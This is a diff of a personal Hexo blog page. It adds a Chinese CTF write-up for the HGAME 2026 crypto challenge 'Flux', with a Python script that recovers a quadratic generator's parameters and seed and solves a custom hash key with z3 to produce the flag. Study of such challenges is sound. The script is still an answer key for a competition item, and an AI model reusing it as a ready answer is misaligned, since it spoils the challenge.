+<h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="Flux"><a href="#Flux" class="headerlink" title="Flux"></a>Flux</h3><p>题目给出自定义二次同余递推类<code>Flux</code>和哈希函数<code>shash</code>的实现代码，运行后生成<code>data.txt</code>（包含<code>Flux</code>的4个连续输出值、260位素数模数<code>n</code>）。已知<code>shash</code>的密钥<code>key</code>位长小于70，目标是恢复<code>key</code>，并计算<code>shash(&quot;I get the key now!&quot;, key)</code>的十六进制结果，用<code>VIDAR{...}</code>包裹为flag。</p>
+<p>EXP如下</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> ast
+<span class="token keyword">from</span> typing <span class="token keyword">import</span> Tuple<span class="token punctuation">,</span> Optional
+
+<span class="token keyword">def</span> <span class="token function">read_data</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Tuple<span class="token punctuation">[</span><span class="token builtin">list</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'data.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+        xs <span class="token operator">=</span> ast<span class="token punctuation">.</span>literal_eval<span class="token punctuation">(</span>f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        n <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> xs<span class="token punctuation">,</span> n
+
+<span class="token keyword">def</span> <span class="token function">inv</span><span class="token punctuation">(</span>a<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> n<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">int</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">legendre</span><span class="token punctuation">(</span>a<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> p<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">int</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">tonelli_shanks</span><span class="token punctuation">(</span>a<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> p<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Optional<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> a <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token number">0</span>
+    <span class="token keyword">if</span> legendre<span class="token punctuation">(</span>a<span class="token punctuation">,</span> p<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token boolean">None</span>
+    <span class="token keyword">if</span> p <span class="token operator">%</span> <span class="token number">4</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token punctuation">(</span>p <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">4</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>
+    q <span class="token operator">=</span> p <span class="token operator">-</span> <span class="token number">1</span>
+    s <span class="token operator">=</span> <span class="token number">0</span>
+    <span class="token keyword">while</span> q <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
+        q <span class="token operator">//=</span> <span class="token number">2</span>
+        s <span class="token operator">+=</span> <span class="token number">1</span>
+    z <span class="token operator">=</span> <span class="token number">2</span>
+    <span class="token keyword">while</span> legendre<span class="token punctuation">(</span>z<span class="token punctuation">,</span> p<span class="token punctuation">)</span> <span class="token operator">!=</span> p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">:</span>
+        z <span class="token operator">+=</span> <span class="token number">1</span>
+    c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>z<span class="token punctuation">,</span> q<span class="token punctuation">,</span> p<span class="token punctuation">)</span>
+    x <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token punctuation">(</span>q <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>
+    t <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> q<span class="token punctuation">,</span> p<span class="token punctuation">)</span>
+    m <span class="token operator">=</span> s
+    <span class="token keyword">while</span> t <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>
+        i <span class="token operator">=</span> <span class="token number">1</span>
+        t2i <span class="token operator">=</span> <span class="token punctuation">(</span>t <span class="token operator">*</span> t<span class="token punctuation">)</span> <span class="token operator">%</span> p
+        <span class="token keyword">while</span> t2i <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>
+            t2i <span class="token operator">=</span> <span class="token punctuation">(</span>t2i <span class="token operator">*</span> t2i<span class="token punctuation">)</span> <span class="token operator">%</span> p
+            i <span class="token operator">+=</span> <span class="token number">1</span>
+            <span class="token keyword">if</span> i <span class="token operator">==</span> m<span class="token punctuation">:</span>
+                <span class="token keyword">return</span> <span class="token boolean">None</span>
+        b <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>m <span class="token operator">-</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>
+        x <span class="token operator">=</span> <span class="token punctuation">(</span>x <span class="token operator">*</span> b<span class="token punctuation">)</span> <span class="token operator">%</span> p
+        t <span class="token operator">=</span> <span class="token punctuation">(</span>t <span class="token operator">*</span> b <span class="token operator">*</span> b<span class="token punctuation">)</span> <span class="token operator">%</span> p
+        c <span class="token operator">=</span> <span class="token punctuation">(</span>b <span class="token operator">*</span> b<span class="token punctuation">)</span> <span class="token operator">%</span> p
+        m <span class="token operator">=</span> i
+    <span class="token keyword">return</span> x
+
+<span class="token keyword">def</span> <span class="token function">solve_abc</span><span class="token punctuation">(</span>xs<span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">,</span> n<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Tuple<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+    x1<span class="token punctuation">,</span> x2<span class="token punctuation">,</span> x3<span class="token punctuation">,</span> x4 <span class="token operator">=</span> xs
+    A <span class="token operator">=</span> <span class="token punctuation">(</span>x2 <span class="token operator">*</span> x2 <span class="token operator">-</span> x1 <span class="token operator">*</span> x1<span class="token punctuation">)</span> <span class="token operator">%</span> n
+    B <span class="token operator">=</span> <span class="token punctuation">(</span>x2 <span class="token operator">-</span> x1<span class="token punctuation">)</span> <span class="token operator">%</span> n
+    C <span class="token operator">=</span> <span class="token punctuation">(</span>x3 <span class="token operator">-</span> x2<span class="token punctuation">)</span> <span class="token operator">%</span> n
+    D <span class="token operator">=</span> <span class="token punctuation">(</span>x3 <span class="token operator">*</span> x3 <span class="token operator">-</span> x2 <span class="token operator">*</span> x2<span class="token punctuation">)</span> <span class="token operator">%</span> n
+    E <span class="token operator">=</span> <span class="token punctuation">(</span>x3 <span class="token operator">-</span> x2<span class="token punctuation">)</span> <span class="token operator">%</span> n
+    F <span class="token operator">=</span> <span class="token punctuation">(</span>x4 <span class="token operator">-</span> x3<span class="token punctuation">)</span> <span class="token operator">%</span> n
+    det <span class="token operator">=</span> <span class="token punctuation">(</span>A <span class="token operator">*</span> E <span class="token operator">-</span> B <span class="token operator">*</span> D<span class="token punctuation">)</span> <span class="token operator">%</span> n
+    det_inv <span class="token operator">=</span> inv<span class="token punctuation">(</span>det<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
+    a <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>E <span class="token operator">*</span> C <span class="token operator">-</span> B <span class="token operator">*</span> F<span class="token punctuation">)</span> <span class="token operator">%</span> n<span class="token punctuation">)</span> <span class="token operator">*</span> det_inv <span class="token operator">%</span> n
+    b <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>A <span class="token operator">*</span> F <span class="token operator">-</span> D <span class="token operator">*</span> C<span class="token punctuation">)</span> <span class="token operator">%</span> n<span class="token punctuation">)</span> <span class="token operator">*</span> det_inv <span class="token operator">%</span> n
+    c <span class="token operator">=</span> <span class="token punctuation">(</span>x2 <span class="token operator">-</span> <span class="token punctuation">(</span>a <span class="token operator">*</span> x1 <span class="token operator">*</span> x1 <span class="token operator">+</span> b <span class="token operator">*</span> x1<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> n
+    <span class="token keyword">return</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c
+
+<span class="token keyword">def</span> <span class="token function">recover_seed</span><span class="token punctuation">(</span>x1<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> a<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> b<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> c<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> n<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Tuple<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> a <span class="token operator">%</span> n <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
+        x0 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x1 <span class="token operator">-</span> c<span class="token punctuation">)</span> <span class="token operator">*</span> inv<span class="token punctuation">(</span>b<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> n
+        <span class="token keyword">return</span> x0<span class="token punctuation">,</span> x0
+    two_a_inv <span class="token operator">=</span> inv<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> a<span class="token punctuation">)</span> <span class="token operator">%</span> n<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
+    delta <span class="token operator">=</span> <span class="token punctuation">(</span>b <span class="token operator">*</span> b <span class="token operator">-</span> <span class="token number">4</span> <span class="token operator">*</span> a <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>c <span class="token operator">-</span> x1<span class="token punctuation">)</span> <span class="token operator">%</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> n
+    r <span class="token operator">=</span> tonelli_shanks<span class="token punctuation">(</span>delta<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> r <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+        <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">"no sqrt for delta"</span><span class="token punctuation">)</span>
+    x0a <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">-</span>b <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">%</span> n<span class="token punctuation">)</span> <span class="token operator">*</span> two_a_inv <span class="token operator">%</span> n
+    x0b <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">-</span>b <span class="token operator">-</span> r<span class="token punctuation">)</span> <span class="token operator">%</span> n<span class="token punctuation">)</span> <span class="token operator">*</span> two_a_inv <span class="token operator">%</span> n
+    <span class="token keyword">return</span> x0a<span class="token punctuation">,</span> x0b
+
+<span class="token keyword">def</span> <span class="token function">shash_py</span><span class="token punctuation">(</span>value<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> key<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">int</span><span class="token punctuation">:</span>
+    mask <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">256</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span>
+    x <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>value<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> mask
+    <span class="token keyword">for</span> ch <span class="token keyword">in</span> value<span class="token punctuation">:</span>
+        x <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>key <span class="token operator">*</span> x<span class="token punctuation">)</span> <span class="token operator">&amp;</span> mask<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span>
+    x <span class="token operator">^</span><span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token operator">&amp;</span> mask
+    <span class="token keyword">return</span> x
+
+<span class="token keyword">def</span> <span class="token function">solve_key_with_z3</span><span class="token punctuation">(</span>h<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> value<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">int</span><span class="token punctuation">:</span>
+    <span class="token keyword">from</span> z3 <span class="token keyword">import</span> BitVec<span class="token punctuation">,</span> Solver<span class="token punctuation">,</span> BitVecVal<span class="token punctuation">,</span> ULE
+    key <span class="token operator">=</span> BitVec<span class="token punctuation">(</span><span class="token string">'key'</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span>
+    s <span class="token operator">=</span> Solver<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>ULE<span class="token punctuation">(</span>key<span class="token punctuation">,</span> BitVecVal<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">70</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    x <span class="token operator">=</span> BitVecVal<span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>value<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span>
+    <span class="token keyword">for</span> ch <span class="token keyword">in</span> value<span class="token punctuation">:</span>
+        x <span class="token operator">=</span> <span class="token punctuation">(</span>key <span class="token operator">*</span> x<span class="token punctuation">)</span> <span class="token operator">^</span> BitVecVal<span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span>
+    x <span class="token operator">=</span> x <span class="token operator">^</span> BitVecVal<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span>
+    s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>x <span class="token operator">==</span> BitVecVal<span class="token punctuation">(</span>h<span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> s<span class="token punctuation">.</span>check<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>r <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>
+        <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">"unsat"</span><span class="token punctuation">)</span>
+    m <span class="token operator">=</span> s<span class="token punctuation">.</span>model<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    kval <span class="token operator">=</span> m<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">.</span>as_long<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> kval
+
+<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    xs<span class="token punctuation">,</span> n <span class="token operator">=</span> read_data<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c <span class="token operator">=</span> solve_abc<span class="token punctuation">(</span>xs<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
+    x0a<span class="token punctuation">,</span> x0b <span class="token operator">=</span> recover_seed<span class="token punctuation">(</span>xs<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
+    value <span class="token operator">=</span> <span class="token string">"Welcome to HGAME 2026!"</span>
+    cand <span class="token operator">=</span> <span class="token punctuation">[</span>x0a<span class="token punctuation">,</span> x0b<span class="token punctuation">]</span>
+    key <span class="token operator">=</span> <span class="token boolean">None</span>
+    seed <span class="token operator">=</span> <span class="token boolean">None</span>
+    <span class="token keyword">for</span> h <span class="token keyword">in</span> cand<span class="token punctuation">:</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            k <span class="token operator">=</span> solve_key_with_z3<span class="token punctuation">(</span>h<span class="token punctuation">,</span> value<span class="token punctuation">)</span>
+            key <span class="token operator">=</span> k
+            seed <span class="token operator">=</span> h
+            <span class="token keyword">break</span>
+        <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
+            <span class="token keyword">pass</span>
+    <span class="token keyword">if</span> key <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"key not found"</span><span class="token punctuation">)</span>
+    magic_word <span class="token operator">=</span> <span class="token string">"I get the key now!"</span>
+    flag <span class="token operator">=</span> <span class="token string">"VIDAR&#123;"</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>shash_py<span class="token punctuation">(</span>magic_word<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"&#125;"</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>seed<span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>最终得到flag</p>
+<p><img src="https://raw.githubusercontent.com/DODOR-ddd/Image/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-02-08%20213711.png"></p>
+
+      
     </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
 </div>
 
-<script src="/libs/aplayer/APlayer.min.js"></script>
-<script src="/libs/aplayer/Meting.min.js"></script>
+
+
 
     
 
-    <div class="container row center-align"
-         style="margin-bottom: 0px !important;">
-        <div class="col s12 m8 l8 copy-right">
-            Copyright&nbsp;&copy;
-            
-                <span id="year">2025-2026</span>
-            
-            <a href="/about" target="_blank">DODOR</a>
-            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
-            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
-            
-            <br>
-            
-            
-            
-                
-            
-            
-                <span id="busuanzi_container_site_pv">
-                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;Total visits:&nbsp;
-                    <span id="busuanzi_value_site_pv" class="white-color"></span>
-            </span>
-            
-            
-                <span id="busuanzi_container_site_uv">
-                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;Total visitors:&nbsp;
-                    <span id="busuanzi_value_site_uv" class="white-color"></span>
-            </span>
-            
-            <br>
 
-            <!-- 运行天数提醒. -->
-            
-            <br>
-            
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://dodor-ddd.github.io/2025/12/20/DODOR-blog/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/medias/qingxu.jpg">
+      <meta itemprop="name" content="DODOR">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="DODOR's BLOG">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | DODOR's BLOG">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2025/12/20/DODOR-blog/" class="post-title-link" itemprop="url">DODOR-blog</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2025-12-20 11:54:25" itemprop="dateCreated datePublished" datetime="2025-12-20T11:54:25+08:00">2025-12-20</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-04-22 16:14:02" itemprop="dateModified" datetime="2026-04-22T16:14:02+08:00">2026-04-22</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%9D%82%E8%B0%88/" itemprop="url" rel="index"><span itemprop="name">杂谈</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
         </div>
-        <div class="col s12 m4 l4 social-link social-statis">
-    <a href="https://github.com/dodor-ddd" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
-        <i class="fab fa-github"></i>
-    </a>
+      </header>
 
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>hello,this is my first blog.In my blog ,I’ll share sth interesting and public my wp.Thanks for reading.</p>
 
-
-    <a href="mailto:2462856021@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
-        <i class="fas fa-envelope-open"></i>
-    </a>
-
-
-
-
-
-
-
-    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2462856021" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2462856021" data-position="top" data-delay="50">
-        <i class="fab fa-qq"></i>
-    </a>
-
-
-
-
-
-
-
-</div>
+      
     </div>
-</footer>
 
-<div class="progress-bar"></div>
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
 
 
-    <!-- 搜索遮罩框 -->
-<div id="searchModal" class="modal">
-    <div class="modal-content">
-        <div class="search-header">
-            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;Search</span>
-            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
-                   class="search-input">
-        </div>
-        <div id="searchResult"></div>
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2025 – 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-code"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">DODOR</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
     </div>
-</div>
+  </footer>
 
-<script type="text/javascript">
-$(function () {
-    var searchFunc = function (path, search_id, content_id) {
-        'use strict';
-        $.ajax({
-            url: path,
-            dataType: "xml",
-            success: function (xmlResponse) {
-                // get the contents from search data
-                var datas = $("entry", xmlResponse).map(function () {
-                    return {
-                        title: $("title", this).text(),
-                        content: $("content", this).text(),
-                        url: $("url", this).text()
-                    };
-                }).get();
-                var $input = document.getElementById(search_id);
-                var $resultContent = document.getElementById(content_id);
-                $input.addEventListener('input', function () {
-                    var str = '<ul class=\"search-result-list\">';
-                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
-                    $resultContent.innerHTML = "";
-                    if (this.value.trim().length <= 0) {
-                        return;
-                    }
-                    // perform local searching
-                    datas.forEach(function (data) {
-                        var isMatch = true;
-                        var data_title = data.title.trim().toLowerCase();
-                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
-                        var data_url = data.url;
-                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
-                        var index_title = -1;
-                        var index_content = -1;
-                        var first_occur = -1;
-                        // only match artiles with not empty titles and contents
-                        if (data_title !== '' && data_content !== '') {
-                            keywords.forEach(function (keyword, i) {
-                                index_title = data_title.indexOf(keyword);
-                                index_content = data_content.indexOf(keyword);
-                                if (index_title < 0 && index_content < 0) {
-                                    isMatch = false;
-                                } else {
-                                    if (index_content < 0) {
-                                        index_content = 0;
-                                    }
-                                    if (i === 0) {
-                                        first_occur = index_content;
-                                    }
-                                }
-                            });
-                        }
-                        // show search results
-                        if (isMatch) {
-                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
-                            var content = data.content.trim().replace(/<[^>]+>/g, "");
-                            if (first_occur >= 0) {
-                                // cut out 100 characters
-                                var start = first_occur - 20;
-                                var end = first_occur + 80;
-                                if (start < 0) {
-                                    start = 0;
-                                }
-                                if (start === 0) {
-                                    end = 100;
-                                }
-                                if (end > content.length) {
-                                    end = content.length;
-                                }
-                                var match_content = content.substr(start, end);
-                                // highlight all keywords
-                                keywords.forEach(function (keyword) {
-                                    var regS = new RegExp(keyword, "gi");
-                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
-                                });
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
